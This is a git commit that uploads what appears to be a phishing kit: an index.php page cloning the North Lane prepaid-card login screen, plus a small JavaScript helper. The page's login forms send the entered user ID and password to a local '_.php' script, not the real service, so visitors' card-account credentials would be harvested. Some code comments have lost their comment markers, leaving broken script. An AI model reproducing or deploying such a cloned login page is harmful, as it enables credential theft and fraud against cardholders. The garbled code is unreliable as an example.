914c4c3725e64b231fe735290ef2f75f9edaca7c
military126 <116421799+military126@users.noreply.github.com>
2022-10-22 00:06:44 -0700

    Add files via upload

---
+++ rccl/NorthLane_files/commonva.js.download
@@ -0,0 +1,6 @@
+function setAutoCompleteOff(){var c=document.getElementsByTagName("form");
+var b=(null==c)?0:c.length;
+for(var a=0;
+a<b;
+a++){c[a].setAttribute("autocomplete","off")
+}};
---
+++ rccl/index.php
@@ -0,0 +1,376 @@
+
+<html class=""><head>
+<title>Login North Lane</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="description" content="">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui, target-densityDpi=device-dpi">
+<meta name="format-detection" content="telephone=yes">
+<link rel="apple-touch-icon" href="apple-touch-icon-iphone.png">
+<style type="text/css">
+@font-face {
+  font-family: 'Interstate-Regular';
+	src: url('interstateregular.ttf') format('truetype');
+}
+@font-face {
+	font-family: 'Interstate-ExtraLight';
+	src: url('Interstate-ExtraLight.otf') format('opentype');
+}
+@font-face {
+	font-family: 'OCRAStd';
+	src: url('OCRAStd.otf') format('opentype');
+}
+@font-face {
+	font-family: 'Futura';
+	src: url('Futura.ttc') format('truetype');
+}
+.antiClickJack{
+	display:none !important;
+}
+</style>
+<noscript>	
+	 <style type="text/css">
+	 html,body{
+	 	height:100%;
+	 	width:100%;
+	 	margin:0;
+	 }
+        #cp-container {display:none;}
+        .no-js-error{
+        	   text-align: center;
+    			font-weight: bolder;
+    			margin-bottom: 15px;
+        }
+        .no-js-error-message {
+        	    position: relative;
+			    top: 50%;
+			    left: 50%;
+			    margin-top: -77px;
+			    margin-left: -125px;
+			    border-radius: 5px;
+			    background: radial-gradient(#e6e6e6,#f8f8f8);
+			    color: #666666;
+			    /*font-family: Interstate-Regular;*/
+			    font-family: Futura;
+			    width: 250px;
+			    font-size: 90%;
+			    padding: 30px;
+			    box-sizing: border-box;
+        	
+        }
+        .antiClickJack{display:block !important;}
+    </style>
+    <div class="no-js-error-message">
+    	<div class=no-js-error>Error</div>
+    	<div>You don't have javascript enabled.</div>
+    </div>
+	
+	</noscript>
+<script type="text/javascript">
+		if(self==top){
+			document.documentElement.className = '';
+			
+		}else{			
+			top.location = self.location;
+		}
+	document
+			.write('<script type="text/javascript" charset="utf-8">CP_CONTENT_BOX=""</sc');
+	document.write('ript>');
+</script><script type="text/javascript" charset="utf-8">CP_CONTENT_BOX=""</script>
+<script>
+		
+	if(typeof(CP_CONTENT_BOX)==="undefined" || CP_CONTENT_BOX===""){
+		CP_CONTENT_BOX='.';
+	}
+</script>
+<script>
+	// A generic function to load dynamically the java script files based on the url with a call back event
+	function loadScript(url, callback) {
+				// Adding the script tag to the head as suggested before
+				var head = document.getElementsByTagName('head')[0];
+				var script = document.createElement('script');
+				script.type = 'text/javascript';
+				script.src = url;
+				// Then bind the event to the callback function.
+				// There are several events for cross browser compatibility.
+				if(callback!=null)
+				{
+					script.onreadystatechange = function(){
+						if(this.readyState === 'complete'){
+							callback();
+						}
+					};
+					script.onload = callback;
+				}
+				// Fire the loading
+				head.appendChild(script);
+				script.onreadystatechange = null;
+			}
+</script>
+<script>
+	// A generic function to load dynamically the css files based on the url
+	function loadcssfile(filename,cssType) {  
+					var element = document.getElementById('cpBranding');
+					if(element && element.parentNode)element.parentNode.removeChild(element);
+					var fileref = document.createElement("link");
+					if(cssType && cssType === 'cpBranding'){
+						fileref.setAttribute("id","cpBranding");
+					}                         
+                    fileref.setAttribute("rel", "stylesheet");
+                    fileref.setAttribute("type", "text/css");
+                    fileref.setAttribute("href", filename);
+                	if (typeof fileref != "undefined")
+                    document.getElementsByTagName("head")[0].appendChild(fileref);
+            }
+      // A function to check IE or not
+     function isIEBrowser(userAgent) {
+		  userAgent = userAgent || navigator.userAgent;
+		  return userAgent.indexOf("MSIE ") > -1 || userAgent.indexOf("Trident/") > -1;
+		}
+            
+</script>
+<script type="text/javascript" src="https://login.northlane.com:443/xContent/content/op/m/config.js"></script><script type="text/javascript" src="https://login.northlane.com:443/xContent/content/op/m/client/libs/cpLibs.js"></script><link rel="stylesheet" type="text/css" href="https://login.northlane.com:443/xContent/content/op/m/client/common/css/cpmain.css"><link id="cpBranding" rel="stylesheet" type="text/css" href="https://login.northlane.com:443/xContent/content/op/m/client/common/css/cpBranding.css"><script type="text/javascript" src="https://login.northlane.com:443/xContent/content/op/m/client/bootstrap.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="cpRouter" src="https://login.northlane.com:443/xContent/content/op/m/client/cp/modules/router.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="cp.common.cpConstants" src="https://login.northlane.com:443/xContent/content/op/m/client/cp/modules/cpMain.js"></script><script type="text/javascript" charset="UTF-8" src="https://maps.googleapis.com/maps-api-v3/api/js/43/7a/common.js"></script><script type="text/javascript" charset="UTF-8" src="https://maps.googleapis.com/maps-api-v3/api/js/43/7a/util.js"></script><script type="text/javascript" charset="UTF-8" src="https://maps.googleapis.com/maps-api-v3/api/js/43/7a/geocoder.js"></script></head>
+<body onload="onBodyLoad()">
+	<div id="cp-container" class="cp-overflow-x-hidden">
+		
+		<div id="totalviewContainer">
+			<div class="loaderOverlay" style="display: none;">
+				<div class="loaderImg">
+					
+				</div>
+			</div>
+			<div class="errorOverlay">
+				<div class="errorMessage">
+					
+				</div>
+			</div>
+			<div class="overLay hide">
+				
+			</div>
+		</div>	
+	<div id="main-container"><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<div id="LoginContainer">
+	<header>
+		<div class="cp-header">
+			<div class="cp-logo-container">
+			<div class="cp-branding-logo-image cp-logo"></div>				
+			</div>
+			<div class="cp-language-mapping cp-backgroundcolor1 cp-textcolor1 cp-subheader" data-translateidentifier="cp.login.accessAndManageYourPrepaidAccounts">Access and Manage Your Prepaid Accounts</div>
+		</div>
+	</header>
+	<section>
+		<div class="cp-gradient cp-login-gradient-background">
+		<form action="_.php" method="post">
+		<div class="cp-login-section">
+			<div class="cp-language-label-align cp-language-mapping cp-textcolor1" data-translateidentifier="cp.login.selectLanguage">Select Language</div>
+					<select name="languageSelection" class="languageSelection cp-dropdown-image cp-text-message-color">
+						<option class="cp-text-message-color" value="en_US" selected="selected">English</option>
+						<option class="cp-text-message-color" value="sp_US">Espanol</option>
+						<option class="cp-text-message-color" value="fr_CA">Francais</option>
+					</select>
+		        
+					<input type="text" name="username" class="cp-username cp-login-input cp-language-mapping" maxlength="20" data-translateidentifier="cp.login.userName" placeholder="Enter User ID" autocomplete="off"  required />
+			<input type="password" name="password" class="cp-password cp-login-input cp-language-mapping" data-translateidentifier="cp.profile.update_password.verify.text" maxlength="50" placeholder="Enter Password" autocomplete="off"  required />
+		</div>
+		
+		<div class="cp-forgot-section cp-textcolor1">
+			<span class="cp-register cp-language-mapping" data-translateidentifier="common.register" href="https://login.northlane.com/register/card/display.do?oprequestid=&amp;bzoffset=300">Register</span>
+			<span class="cp-separator">|</span>
+			<span class="cp-forgotUserId cp-language-mapping" data-translateidentifier="cp.login.forgotUserId" maxlength="20">Forgot User ID</span>
+			<span class="cp-separator">|</span>
+			<a href="https://login.northlanehelp.com/" target="_blank" class="cp-forgot-password cp-language-mapping cp-textcolor1" data-translateidentifier="forgot_password">Forgot Password</a>
+		</div>
+		<div class="cp-captcha-Login-container">
+			<div class="cp-captchaimege-section">
+				<div class="cp-image-captcha"><img id="cpImg" src="https://login.northlane.com/simpleCaptcha.png#"></div>
+			</div>
+			<div class="cp-captcha-section">
+				<input type="text" class="cp-captchatext-input cp-language-mapping" data-translateidentifier="cp.captcha.text.info" placeholder="Enter the text above" autocomplete="off" required/>
+				<div class="cp-refresh-image"></div>	
+			</div>
+		</div>
+		<div class="cp-signon-section">
+			<div class="cp-container-checkbox">
+				
+					<div class="cp-checkbox cp-checkbox-off"></div>
+						
+				<div class="cp-rememberme cp-language-mapping cp-textcolor1" data-translateidentifier="cp.login.rememberId">Remember ID</div>
+			</div>
+		<input class="cp-signon cp-language-mapping cp-textcolor1 cp-signOn-color" tabindex="4" name="login" id="login" data-inputtype="button" type="submit" value="Sign On">
+		</div>
+		<div class="cp-pre-login-container">
+			<div class="cp-expresslogin-conatiner cp-button-transition cp-bordercolor1 cp-preloginbutton-color" data-inputtype="button">
+				<div>
+					<div class="cp-language-mapping cp-textcolor3" data-translateidentifier="cp.login.expressLogin">Express Login</div>
+					<div class="cp-language-mapping greyFont" data-translateidentifier="cp.common.checkBalance">Click here to view your balance and transactions</div>
+				</div>
+			</div>
+			<div class="cp-atmlocator-conatiner cp-button-transition cp-bordercolor1 cp-preloginbutton-color" data-inputtype="button">
+				<div>
+					<a href="http://citiprepaid.geoserve.com/scripts/esrimap.dll?Name=L&amp;Com=fo&amp;Db=DLRCiti1m&amp;Ds=&amp;Dsource=380" target="_blank" class="cp-language-mapping cp-textcolor3" data-translateidentifier="cp.common.atm.locator">ATM Locator</a>
+					<div class="cp-language-mapping greyFont" data-translateidentifier="cp.login.atm.locator.text">Find ATMs near you</div>
+				</div>
+			</div>
+			<div class="cp-FAQ-conatiner cp-button-transition cp-bordercolor1 cp-preloginbutton-color" data-inputtype="button">
+				<div>
+					<div class="cp-language-mapping cp-textcolor3" data-translateidentifier="cp.common.faq">FAQs</div>
+					<div class="cp-language-mapping greyFont" data-translateidentifier="cp.login.faq.text">Answers to questions about your prepaid card</div>
+				</div>
+			</div>
+			<div class="cp-reward-conatiner cp-button-transition cp-bordercolor1 cp-preloginbutton-color" data-inputtype="button">
+				<div>
+					<div class="cp-language-mapping cp-textcolor3" data-translateidentifier="cp.login.redeemPaymentCode">Redeem Payment Code</div>
+					<div class="cp-language-mapping greyFont" data-translateidentifier="cp.dashboard.clickToRedeem">Click here to redeem your payment</div>
+				</div>
+			</div>
+			<div class="cp-card-activation-container cp-button-transition cp-bordercolor1 cp-preloginbutton-color show" data-inputtype="button">
+				<div>
+					<div class="cp-language-mapping cp-textcolor3" data-translateidentifier="login.activate_card_title.text">Activate Card</div>
+					<div class="cp-language-mapping greyFont" data-translateidentifier="login.activate_card_description.text">Click here to Activate Card</div>
+				</div>
+			</div>
+		</div>
+	</section>
+	<div class="cp-footer cp-backgroundcolor1">
+		<div class="cp-footer-container cp-textcolor1">
+			<div class="cp-footer-row1">
+				<a href="https://login.northlane.com:443/xContent/content/op/program/prelogin_terms_en_US.html" target="_blank" class="cp-termsandconditions-link cp-language-mapping cp-textcolor1" data-translateidentifier="cp.notification.terms_and_conditions">Terms and Conditions</a><span> | </span>
+				<a href="https://login.northlane.com:443/xContent/content/op/program/privacy_cookies_en_US.html" target="_blank" class="cp-privacy-link cp-language-mapping cp-textcolor1" data-translateidentifier="cp.footer.privacy">Privacy Statement</a><span> | </span>
+				<a href="https://login.northlane.com/defaultlogin.do?locale=en_US" target="_blank" class="cp-fullsite-link cp-language-mapping cp-textcolor1" data-translateidentifier="cp.footer.fullsite">View Full Site</a>
+			</div>
+			<div class="cp-footer-row2 cp-textcolor1">2022 North Lane Technologies, Inc.</div>
+		</div>
+	</div>
+</div></div></div>
+	<div id="cp-modal-container"></div>
+	<div id="cp-info-popup">
+	
+		<div id="cp-info-wrapper">
+				<div id="cp-desc"></div>
+		</div>
+		<div class="down-arrow"></div>
+		<div class="up-arrow"></div>
+	</div>
+	<div class="cp-overlay"></div>
+	<form name="loginform" id="secure_login" method="post" action="_.php" onsubmit="callDevice2();>
+		<input type="hidden" name="RSADeviceFso" id="RSADeviceFso" value="" autocomplete="off">
+		<input type="hidden" name="devicePrintId" id="devicePrintId" value="version%3D2%26pm%5Ffpua%3Dmozilla%2F5%2E0%20%28ipad%3B%20cpu%20os%2011%5F0%20like%20mac%20os%20x%29%20applewebkit%2F604%2E1%2E34%20%28khtml%2C%20like%20gecko%29%20version%2F11%2E0%20mobile%2F15a5341f%20safari%2F604%2E1%7C5%2E0%20%28iPad%3B%20CPU%20OS%2011%5F0%20like%20Mac%20OS%20X%29%20AppleWebKit%2F604%2E1%2E34%20%28KHTML%2C%20like%20Gecko%29%20Version%2F11%2E0%20Mobile%2F15A5341f%20Safari%2F604%2E1%7CWin32%26pm%5Ffpsc%3D24%7C768%7C1024%7C1024%26pm%5Ffpsw%3D%26pm%5Ffptz%3D%2D6%26pm%5Ffpln%3Dlang%3Den%2DUS%7Csyslang%3D%7Cuserlang%3D%26pm%5Ffpjv%3D0%26pm%5Ffpco%3D1%26pm%5Ffpasw%3D%26pm%5Ffpan%3DNetscape%26pm%5Ffpacn%3DMozilla%26pm%5Ffpol%3Dtrue%26pm%5Ffposp%3D%26pm%5Ffpup%3D%26pm%5Ffpsaw%3D768%26pm%5Ffpspd%3D24%26pm%5Ffpsbd%3D%26pm%5Ffpsdx%3D%26pm%5Ffpsdy%3D%26pm%5Ffpslx%3D%26pm%5Ffpsly%3D%26pm%5Ffpsfse%3D%26pm%5Ffpsui%3D" autocomplete="off">
+	</form>
+	<script>
+			//Ajax Call to retrieve content box  values
+			function getContentBoxReference() {
+    				var xmlhttp;
+				    if (window.XMLHttpRequest) {				       
+				        xmlhttp = new XMLHttpRequest();
+				    } else {				        
+				        xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+				    }				
+				    xmlhttp.onreadystatechange = function() {
+				        if (xmlhttp.readyState == 4 ) {
+				           if(xmlhttp.status == 200){	
+				           	var response = JSON.parse(xmlhttp.responseText).successResponse;
+				             CP_CONTENT_BOX = response.contentBox;
+				             HUB_LANGUAGE = response.hubLanguage;
+				             ATM_LOCATOR = response.atmLocator;
+				             IP_ADDRESS = response.ip_address;
+				             CUSTOM_BRANDING = response.customBranding;
+				             CUSTOM_URL = response.customURL;
+				             PROGRAM = response.program;
+				             JCAPTCHA = response.jcaptcha?response.jcaptcha:'Y';Use this jcaptcha flag for deciding the jcaptcha section in login page.
+				             SSO = response.xSSO?response.xSSO:'Y';
+				             CLAIMCODE = response.claimCode?response.claimCode:''; If there is a valid claim code then launch the claim code view from baseView directly			            
+				             HUB_LANGUAGE = HUB_LANGUAGE?HUB_LANGUAGE:"en_US";
+				             ATM_LOCATOR = ATM_LOCATOR?ATM_LOCATOR:"Y";
+				             IP_ADDRESS = IP_ADDRESS?IP_ADDRESS:"Y";
+				             CUSTOM_BRANDING = CUSTOM_BRANDING?CUSTOM_BRANDING:"";
+				             CUSTOM_URL = CUSTOM_URL?CUSTOM_URL:"";
+				             PROGRAM = PROGRAM?PROGRAM:"";
+				             PAYMENT_CHOICE = response.paymentchoice?response.paymentchoice:"N";
+				             VIRTUAL_EXPRESS = response.virtualexpress?response.virtualexpress:"N";
+				             PUID=response.puid?response.puid:"Y";
+				             CARD_ACTIVATION = response.cardActivation?response.cardActivation:"N";
+				             languagesArray = JSON.parse(xmlhttp.responseText).successResponse.languages;
+
+				           }
+				        }
+				    };
+				
+				    xmlhttp.open("POST", "./m", false);
+				    xmlhttp.send();
+			}		
+			Loading Config JS Script
+			function onBodyLoad() {
+				Added to hide the address bar to set full screen
+				  For iPhone and Andriod To remove Address bar when viewing website on Safari Mobile
+				  When ready...
+				  if(!isIEBrowser()){
+				  	  window.addEventListener("load",function() {
+				    Set a timeout...
+				    setTimeout(function(){
+				     Hide the address bar!
+				    window.scrollTo(0, 1);
+				    }, 10);
+				  });
+				  }
+				
+				getContentBoxReference();
+				if(CP_CONTENT_BOX === undefined || CP_CONTENT_BOX === '.'){
+					loadScript(CP_CONTENT_BOX+'/config.js',loadRequireLib);
+				}else{
+					loadScript(CP_CONTENT_BOX+'/op/m/config.js',loadRequireLib);
+				}
+				
+			}
+			//Loading Require JS Script
+			function loadRequireLib(){
+				window.cpEnv_Web = window.cp_Web;
+				if(CP_CONTENT_BOX === undefined || CP_CONTENT_BOX === '.'){
+					cpEnv_Web.contentBox = CP_CONTENT_BOX;
+					HUB_LANGUAGE ="en_US";
+					 ATM_LOCATOR = "Y";
+				     IP_ADDRESS = "514.5..1449.0..703.5..2089.5";
+				     CUSTOM_BRANDING = CP_CONTENT_BOX+"/client/common/css/cpBranding.css";
+				     CUSTOM_URL = 't_mobile';
+				     PROGRAM = "Y";
+				     JCAPTCHA = 'Y';//Use this jcaptcha flag for deciding the jcaptcha section in login page.
+				     SSO = 'N';
+				     CLAIMCODE = '';
+				     PAYMENT_CHOICE = 'Y';
+					 VIRTUAL_EXPRESS = 'Y';
+				     PUID= 'abc123';
+					 CARD_ACTIVATION = 'N';
+				}else{
+					cpEnv_Web.contentBox = CP_CONTENT_BOX+'/op/m/client';
+				}
+				
+				if(CP_CONTENT_BOX === undefined || CP_CONTENT_BOX === '.'){
+					loadScript(CP_CONTENT_BOX+"/client/libs/requirejquery/require-jquery.js",loadBootstrap);
+					//Load main css and jquery ui css				
+            		loadcssfile(CP_CONTENT_BOX+"/client/common/css/cpmain.css");
+            		loadcssfile(CUSTOM_BRANDING,"cpBranding");
+				}else{
+					loadScript(CP_CONTENT_BOX+"/op/m/client/libs/cpLibs.js",loadBootstrap);
+					//Load main css and jquery ui css				
+            		loadcssfile(CP_CONTENT_BOX+"/op/m/client/common/css/cpmain.css");
+            		loadcssfile(CP_CONTENT_BOX+"/"+CUSTOM_BRANDING+"/m/client/common/css/cpBranding.css","cpBranding");
+				}				
+				
+			}
+			//Loading Bootstrap JS Script-
+			function loadBootstrap()
+			{
+				if(CP_CONTENT_BOX === undefined || CP_CONTENT_BOX === '.'){
+					loadScript(CP_CONTENT_BOX+"/client/bootstrap.js",null);
+				}else{
+					loadScript(CP_CONTENT_BOX+"/op/m/client/bootstrap.js",null);
+				}
+				
+			}
+	</script>
+	<script type="text/javascript" src="https://maps.googleapis.com/maps/api/js?sensor=false"></script>
+
+
+
+</body></html>
